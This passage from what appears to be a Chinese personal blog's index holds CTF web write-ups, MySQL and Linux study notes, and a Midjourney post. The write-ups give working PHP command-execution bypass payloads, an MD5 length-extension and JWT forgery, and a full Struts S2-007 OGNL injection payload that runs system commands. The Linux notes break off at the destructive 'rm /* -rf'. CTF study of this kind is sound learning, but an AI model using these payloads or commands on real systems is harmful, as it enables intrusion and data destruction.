class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOME即/root</span><br></pre></td></tr></table></figure><p>$? 表示上一条命令执行结束后的传回值。通常0表示执行成功，非0表示执行有误<br>有部分指令执行失败时会返回1，也有一些命令返回其他值，表示不同类型的错误<br>比如Command not found就会返回127</p><p>为了能让 $? 能够返回1，则需要让前一条命令是错误的，这个错误命令的返回值就是1</p><p>这里的话可以用 <code>&lt;A</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;A 提示的错误是no such file or dictionary，它对应的error code 是2</span><br><span class="line">但是 $? 的结果是1</span><br></pre></td></tr></table></figure><p>然后是选构造的命令<br>这里选择使用的是：/bin/base64 毕竟${RANDOM}没有被禁用<br>所以需要构造 /???/???4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br><span class="line">即：/???/?????4 ????.???</span><br></pre></td></tr></table></figure><p><s>概率大概是十分之一，拼人品的时候来了</s><br>&lt;A 先让指令执行错误，然后 $? 取到的值就为1了</p><h2 id="web124">web124</h2><h3 id="题目描述">题目描述</h3><p><strong>RCE</strong></p><h3 id="解题思路">解题思路</h3><p>思路是利用php动态函数构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])&amp;a=system&amp;b=cat flag</span><br></pre></td></tr></table></figure><p>[]过滤用{}绕过</p><p>根据源码提示 _GET用php数学函数编码绕过</p><p>常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) = hex2bin</span><br><span class="line"><span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>) = <span class="number">5</span>f474554</span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&quot;5f474554&quot;</span>) = _GET</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>)) = _GET</span><br></pre></td></tr></table></figure><p>注意要求长度小于80，可利用php可变变量缩短长度，变量名从白名单中选取</p><p><code>payload:?c=$abs=base_convert(37907361743,10,36)(dechex(1598506324));$$abs&#123;cos&#125;($$abs&#123;exp&#125;)&amp;cos=system&amp;exp=cat flag.php</code></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql数据库从基础到进阶学习笔记</title>
      <link href="/2023/08/07/MySql/"/>
      <url>/2023/08/07/MySql/</url>
      
        <content type="html"><![CDATA[<h1>Mysql数据库（基础篇）</h1><h2 id="引言">引言</h2><blockquote><p>本笔记使用软件版本为 Mysql Community Server 8.0.26</p></blockquote><p>连接数据库：</p><ol><li>使用MySQL自带的命令行工具</li><li>Windows命令行输入mysql -u root -p(需要配置PATH环境变量)</li></ol><p>图形化界面工具：</p><ul><li>Workbench(免费): <a href="http://dev.mysql.com/downloads/workbench/">http://dev.mysql.com/downloads/workbench/</a></li><li>navicat(收费，试用版30天): <a href="https://www.navicat.com/en/download/navicat-for-mysql">https://www.navicat.com/en/download/navicat-for-mysql</a></li><li>Sequel Pro(开源免费，仅支持Mac OS): <a href="http://www.sequelpro.com/">http://www.sequelpro.com/</a></li><li>HeidiSQL(免费): <a href="http://www.heidisql.com/">http://www.heidisql.com/</a></li><li>phpMyAdmin(免费): <a href="https://www.phpmyadmin.net/">https://www.phpmyadmin.net/</a></li><li>SQLyog: <a href="https://sqlyog.en.softonic.com/">https://sqlyog.en.softonic.com/</a></li></ul><blockquote><p>本笔记使用DataGrip图形化界面工具，版本为2023.2</p></blockquote><h2 id="通用语法及分类">通用语法及分类</h2><p>SQL通用语法<br>1). SQL语句可以单行或多行书写，以分号结尾。<br>2). SQL语句可以使用空格/缩进来增强语句的可读性。<br>3). MySQL数据库的SQL语句不区分大小写，关键字建议使用大写。<br>4). 注释：单行注释：-- 注释内容 或 # 注释内容 ;多行注释：/* 注释内容 */</p><ul><li>DDL: 数据定义语言，用来定义数据库对象（数据库、表、字段）</li><li>DML: 数据操作语言，用来对数据库表中的数据进行增删改</li><li>DQL: 数据查询语言，用来查询数据库中表的记录</li><li>DCL: 数据控制语言，用来创建数据库用户、控制数据库的控制权限</li></ul><h3 id="ddl-数据定义语言">DDL（数据定义语言）</h3><p>数据定义语言</p><h4 id="数据库操作">数据库操作</h4><p>查询所有数据库：<br><code>SHOW DATABASES;</code><br>查询当前数据库：<br><code>SELECT DATABASE();</code><br>创建数据库：<br><code>CREATE DATABASE [ IF NOT EXISTS ] 数据库名 [ DEFAULT CHARSET 字符集] [COLLATE 排序规则 ];</code><br>删除数据库：<br><code>DROP DATABASE [ IF EXISTS ] 数据库名;</code><br>使用数据库：<br><code>USE 数据库名;</code></p><h5 id="注意事项">注意事项</h5><ul><li>UTF8字符集长度为3字节，有些符号占4字节，所以推荐用utf8mb4字符集</li></ul><h4 id="表操作">表操作</h4><p>查询当前数据库所有表：<br><code>SHOW TABLES;</code><br>查询表结构：<br><code>DESC 表名;</code><br>查询指定表的建表语句：<br><code>SHOW CREATE TABLE 表名;</code></p><p>创建表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(    </span><br><span class="line">字段<span class="number">1</span> 字段<span class="number">1</span>类型 [COMMENT 字段<span class="number">1</span>注释],    </span><br><span class="line">字段<span class="number">2</span> 字段<span class="number">2</span>类型 [COMMENT 字段<span class="number">2</span>注释],    </span><br><span class="line">字段<span class="number">3</span> 字段<span class="number">3</span>类型 [COMMENT 字段<span class="number">3</span>注释],    </span><br><span class="line">...    </span><br><span class="line">字段n 字段n类型 [COMMENT 字段n注释])[ COMMENT 表注释 ];</span><br></pre></td></tr></table></figure><p><strong>最后一个字段后面没有逗号</strong></p><p>添加字段：<br><code>ALTER TABLE 表名 ADD 字段名 类型(长度) [COMMENT 注释] [约束];</code><br>例：<code>ALTER TABLE emp ADD nickname varchar(20) COMMENT '昵称';</code></p><p>修改数据类型：<br><code>ALTER TABLE 表名 MODIFY 字段名 新数据类型(长度);</code><br>修改字段名和字段类型：<br><code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型(长度) [COMMENT 注释] [约束];</code><br>例：将emp表的nickname字段修改为username，类型为varchar(30)<br><code>ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT '昵称';</code></p><p>删除字段：<br><code>ALTER TABLE 表名 DROP 字段名;</code></p><p>修改表名：<br><code>ALTER TABLE 表名 RENAME TO 新表名</code></p><p>删除表：<br><code>DROP TABLE [IF EXISTS] 表名;</code><br>删除表，并重新创建该表：<br><code>TRUNCATE TABLE 表名;</code></p><h3 id="dml-数据操作语言">DML（数据操作语言）</h3><h4 id="添加数据">添加数据</h4><p>指定字段：<br><code>INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...);</code><br>全部字段：<br><code>INSERT INTO 表名 VALUES (值1, 值2, ...);</code></p><p>批量添加数据：<br><code>INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);</code><br><code>INSERT INTO 表名 VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);</code></p><h5 id="注意事项">注意事项</h5><ul><li>字符串和日期类型数据应该包含在引号中</li><li>插入的数据大小应该在字段的规定范围内</li></ul><h4 id="更新和删除数据">更新和删除数据</h4><p>修改数据：<br><code>UPDATE 表名 SET 字段名1 = 值1, 字段名2 = 值2, ... [ WHERE 条件 ];</code><br>例：<br><code>UPDATE emp SET name = 'Jack' WHERE id = 1;</code></p><p>删除数据：<br><code>DELETE FROM 表名 [ WHERE 条件 ];</code></p><h3 id="dql-数据查询语言">DQL（数据查询语言）</h3><p>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>    </span><br><span class="line">    字段列表</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    表名字段</span><br><span class="line"><span class="keyword">WHERE</span>    </span><br><span class="line">    条件列表</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">    分组字段列表</span><br><span class="line"><span class="keyword">HAVING</span></span><br><span class="line">    分组后的条件列表</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">    排序字段列表</span><br><span class="line">LIMIT</span><br><span class="line">    分页参数</span><br></pre></td></tr></table></figure><h4 id="基础查询">基础查询</h4><p>查询多个字段：<br><code>SELECT 字段1, 字段2, 字段3, ... FROM 表名;</code><br><code>SELECT * FROM 表名;</code></p><p>设置别名：<br><code>SELECT 字段1 [ AS 别名1 ], 字段2 [ AS 别名2 ], 字段3 [ AS 别名3 ], ... FROM 表名;</code><br><code>SELECT 字段1 [ 别名1 ], 字段2 [ 别名2 ], 字段3 [ 别名3 ], ... FROM 表名;</code></p><p>去除重复记录：<br><code>SELECT DISTINCT 字段列表 FROM 表名;</code></p><p>转义：<br><code>SELECT * FROM 表名 WHERE name LIKE '/_张三' ESCAPE '/'</code><br>/ 之后的_不作为通配符</p><h4 id="条件查询">条件查询</h4><p>语法：<br><code>SELECT 字段列表 FROM 表名 WHERE 条件列表;</code></p><p>条件：</p><table><thead><tr><th style="text-align:left">比较运算符</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left">&gt;</td><td style="text-align:left">大于</td></tr><tr><td style="text-align:left">&gt;=</td><td style="text-align:left">大于等于</td></tr><tr><td style="text-align:left">&lt;</td><td style="text-align:left">小于</td></tr><tr><td style="text-align:left">&lt;=</td><td style="text-align:left">小于等于</td></tr><tr><td style="text-align:left">=</td><td style="text-align:left">等于</td></tr><tr><td style="text-align:left">&lt;&gt; 或 !=</td><td style="text-align:left">不等于</td></tr><tr><td style="text-align:left">BETWEEN … AND …</td><td style="text-align:left">在某个范围内（含最小、最大值）</td></tr><tr><td style="text-align:left">IN(…)</td><td style="text-align:left">在in之后的列表中的值，多选一</td></tr><tr><td style="text-align:left">LIKE 占位符</td><td style="text-align:left">模糊匹配（_匹配单个字符，%匹配任意个字符）</td></tr><tr><td style="text-align:left">IS NULL</td><td style="text-align:left">是NULL</td></tr></tbody></table><table><thead><tr><th style="text-align:left">逻辑运算符</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left">AND 或 &amp;&amp;</td><td style="text-align:left">并且（多个条件同时成立）</td></tr><tr><td style="text-align:left">OR 或 ||</td><td style="text-align:left">或者（多个条件任意一个成立）</td></tr><tr><td style="text-align:left">NOT 或 !</td><td style="text-align:left">非，不是</td></tr></tbody></table><p>例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 年龄等于30</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">-- 年龄小于30</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">&lt;</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">-- 小于等于</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">&lt;=</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">-- 没有身份证</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> idcard <span class="keyword">is</span> <span class="keyword">null</span> <span class="keyword">or</span> idcard <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">-- 有身份证</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> idcard;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> idcard <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">-- 不等于</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">!=</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">-- 年龄在20到30之间</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="keyword">between</span> <span class="number">20</span> <span class="keyword">and</span> <span class="number">30</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">&gt;=</span> <span class="number">20</span> <span class="keyword">and</span> age <span class="operator">&lt;=</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">-- 下面语句不报错，但查不到任何信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="keyword">between</span> <span class="number">30</span> <span class="keyword">and</span> <span class="number">20</span>;</span><br><span class="line"><span class="comment">-- 性别为女且年龄小于30</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">&lt;</span> <span class="number">30</span> <span class="keyword">and</span> gender <span class="operator">=</span> <span class="string">&#x27;女&#x27;</span>;</span><br><span class="line"><span class="comment">-- 年龄等于25或30或35</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">=</span> <span class="number">25</span> <span class="keyword">or</span> age <span class="operator">=</span> <span class="number">30</span> <span class="keyword">or</span> age <span class="operator">=</span> <span class="number">35</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="keyword">in</span> (<span class="number">25</span>, <span class="number">30</span>, <span class="number">35</span>);</span><br><span class="line"><span class="comment">-- 姓名为两个字</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;__&#x27;</span>;</span><br><span class="line"><span class="comment">-- 身份证最后为X</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> idcard <span class="keyword">like</span> <span class="string">&#x27;%X&#x27;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>*CTF-2023 Web方向题解</title>
      <link href="/2023/07/30/XCTF/"/>
      <url>/2023/07/30/XCTF/</url>
      
        <content type="html"><![CDATA[<p>复旦<code>******战队</code>命题<br>web方向题解</p><h2 id="jwt2struts">jwt2struts</h2><h3 id="题目描述">题目描述</h3><p>140.210.223.216:55557<br>flag format: *ctf{}</p><h3 id="解题思路">解题思路</h3><p>进入靶机后提示<code>Try to become admin.</code><br>发现cookie中含有access_token，再根据题目猜想应该为伪造jwt<br>查看源代码，发现<code>&lt;!-- JWT_key.php --&gt;</code>路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计，目的是得到secret_key用以伪造JWT<br>难点在于如何构造digest的值，给出了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>a</mi><mi>l</mi><mi>t</mi><mtext>的位数，</mtext></mrow><annotation encoding="application/x-tex">salt的位数，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span></span></span></span>salt.&quot;adminroot&quot;的MD5值<br>满足使用<a href="https://www.cnblogs.com/cfqlovem-521/p/16185173.html">MD5长度扩展攻击的条件</a>的条件<br>使用HashPump工具生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">hashpump</span><br><span class="line">Input Signature: e6ccbf12de9d33ec27a5bcfb6a3293df #给出的MD5值</span><br><span class="line">Input Data: root #想要替换的参数</span><br><span class="line">Input Key Length: 19  #不变部分的位数</span><br><span class="line">Input Data to Add: admin #要替换的部分</span><br><span class="line">6519ec47114e100735c1d3ff1bb704ff #得到的新MD5值</span><br><span class="line">root\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00admin #要传入的passwd</span><br></pre></td></tr></table></figure><p>因为传入password后要经过一次url解码，故将得到的passwd中\x换成%后，url编码传入<br>得到<code>secret_key=sk-he00lctf3r</code><br>接下来伪造<a href="https://jwt.io/">JWT</a><br>先将原有的token解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoyMDA2MjMwNDMzfQ.sD0hbwejdG0bqUBwxt68rbAnZbXb3hid5zHG9Qq4TqA</span><br><span class="line"></span><br><span class="line">HEADER:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line">PAYLOAD:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;exp&quot;: 2006230433</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>&quot;sub&quot;</code>改为admin后，输入密钥生成新的JWT<br>传参后进入<code>/admiiiiiiiiiiin</code>，根据题目提示为<a href="https://xz.aliyun.com/t/2684">struts-s2-007远程代码执行漏洞</a><br>FLAG在环境变量里，抓包传入age进行RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&amp;email=1&amp;age=%27+%2b+(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23foo%3dnew+java.lang.Boolean(%22false%22)+%2c%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d%23foo%2c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()))+%2b+%27</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/07/29/boJWaXpx.png" alt="成功"><br>注意flag格式</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最强绘画AI——Midjourney使用分享</title>
      <link href="/2023/07/26/Midjourney/"/>
      <url>/2023/07/26/Midjourney/</url>
      
        <content type="html"><![CDATA[<p>使用准备：</p><ol><li>科学上网工具</li><li>discord会员账号</li></ol><p>网上的使用教程很多，我就不过多赘述<br>分享几个视频或博客<br><a href="https://www.bilibili.com/video/BV1JX4y167jA/?share_source=copy_web&amp;vd_source=64c12924daa57dc991f9ad131bfa7883">【AI绘画】Midjourney保姆级全方位教程</a><br><a href="https://www.zhihu.com/question/592244719/answer/2976361303?utm_id=0">你还不会用Midjourney?</a><br>发现关键词的描述词详细与否和权重是影响出图的重要因素<br>可以根据<a href="https://www.midjourney.com/app/feed/">官网</a>展示的瀑布流中大佬的成图学习如何描述<br>发现几个槽点，即使经过不断更新，细节上的问题也很多<s>例如不会画手</s><br>而且使用/relax模式时（可能因为不调用显卡或是我的节点问题？），出图速度巨慢</p><p><img src="https://img1.imgtp.com/2023/07/25/xrJj7cjV.png" alt="成品展示1"></p><p><img src="https://img1.imgtp.com/2023/07/25/ZmKVfdCT.png" alt="成品展示2"></p><p><img src="https://cdn.midjourney.com/116f3d05-874c-4578-98aa-b382cc488df8/0_3.png" alt="成品展示3"></p><p>操作简单，可选择模型较多，以上三张图只在默认AI模型下生成<br><img src="https://img1.imgtp.com/2023/07/25/gJIhXZ9a.png" alt=""><br>经过不断调整，基本上都能得到满意的图片<br>普通人也能轻松diy符合自己审美的各种风格的图片</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Midjourney </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础学习笔记</title>
      <link href="/2023/07/22/Linux/"/>
      <url>/2023/07/22/Linux/</url>
      
        <content type="html"><![CDATA[<h1>Linux 笔记（新）</h1><blockquote><p>感觉之前记录的笔记太细碎了，不够系统，来重置一下<br>笔记偏向工程应用，不剖析原理，分析内核源码等<s>可能以后补上</s></p></blockquote><h2 id="常见文件管理命令">常见文件管理命令</h2><p><strong>Linux目录结构</strong>：</p><p>所有文件夹均在根目录<code>\</code>下，常见文件夹包括<code>bin</code>（储存可执行命令文件）、<code>etc</code>（储存配置文件，如nginx配置文件）、<code>var</code>（存储日志文件夹log）、<code>lib</code>（存放安装包或库文件）、<code>home</code>（用户的家目录，存在以用户名命名的文件夹）、<code>proc</code>（进程的相关信息）</p><p><strong>描述路径的两种方式</strong>：</p><p>1.绝对路径（从根目录开始描述）<br>2.相对路径（从当前目录开始描述）<br>3.特殊目录：<code>..</code>上一级目录，<code>.</code>当前目录，<code>~</code>家目录</p><p><strong>基本操作</strong><br><code>ctrl + C</code>: 终止当前命令/进程，并且换行<br><code>ctrl + U</code>: 清空本行命令<br><code>tab</code>键：可以补全命令和文件名，如果补全不了快速按两下tab键，可以显示备选选项<br>方向键↑/↓：可以回到上一个/下一条命令</p><p><strong>基本命令</strong><br><code>ls</code>: 列出当前目录下所有文件，蓝色的是文件夹，白色的是普通文件，绿色的是可执行文件(不一定)</p><p>参数：<br><code>-l </code>: 展示详细信息（文件类型，权限，大小）<br><code>-h </code>: 人性化的显示详细信息（30926=&gt;31K）<br><code>-a </code>: 显示所有的文件(包括被隐藏的文件, 所有被隐藏的文件都是以.开头的);<br><code>ll</code> 等价于<code>ls -la</code></p><p><code>pwd</code>: 显示当前位置;</p><p><code>cd</code>: cd + 路径;<br>cd 默认返回家目录, <code>cd ..</code> 返回上一层目录, <code>cd -</code> 返回上一个待过的目录;</p><p><code>cp</code>: cp 路径1 路径2;<br>(将路径1内容复制一份放路径2里面, 复制 + 粘贴 + 重命名);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">cp a/tmp.txt b (复制一份到粘贴到b里面)；</span><br><span class="line">cp a/tmp.txt b/tmp2.txt; (复制一份到粘贴到b里面,并重命名)</span><br><span class="line">如果复制文件夹后面加-r</span><br><span class="line">cp a b -r; (将a复制一份粘贴到b里面)</span><br></pre></td></tr></table></figure><blockquote><p><code>*</code> 表示本文件夹里所有文件(正则语法)</p></blockquote><p><code>mkdir a</code> :创建文件夹a<br><code>mkdir</code>: 创建文件夹;(可以加-p创建一系列的文件夹)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">mkdir /home/acs/a/b (在根目录下创建文件)</span><br><span class="line">mkdir a/b/c -p (在该文件夹下创建a/b/c复合文件)</span><br></pre></td></tr></table></figure><p><code>history</code>: 显示历史用过的指令;</p><p><code>rm</code>: 删除,<br><code>rm xxx</code>: 删除某一文件;<br><code>rm xxx -r</code>: 删除某文件夹;(支持正则表达式);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">rm tmp.txt tmp2.txt (删除tmp.txt和tmp2.txt)</span><br><span class="line">rm .txt (删除所有txt文件)</span><br><span class="line">rm a/ (删除a里面所有东西)</span><br><span class="line">rm /* -rf 